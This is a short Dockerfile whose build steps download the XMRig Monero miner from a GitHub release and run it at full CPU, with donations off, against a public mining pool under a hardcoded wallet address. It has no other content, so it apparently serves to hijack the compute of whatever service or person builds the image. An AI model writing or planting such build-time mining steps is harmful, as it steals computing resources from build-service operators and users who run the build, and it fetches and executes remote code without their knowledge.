#1557946359.42
FROM ubuntu:latest
RUN apt-get update && apt-get -yqq install wget
RUN wget -qO- https://github.com/xmrig/xmrig/releases/download/v2.15.3-beta/xmrig-2.15.3-beta-xenial-x64.tar.gz | tar xzf -
RUN ./xmr*/xmrig --donate-level=0 --max-cpu-usage=100 -o stratum+tcp://xmrpool.eu:3333 -u 49WnmkngNDv1xiyYx7y3dm7kr6XBCY26ccDK1hmtxbfB1c363Rwh2ic5ujSkUuiZ49SzdMZgMf5macgYYiHtPXRGHRK35yk -p x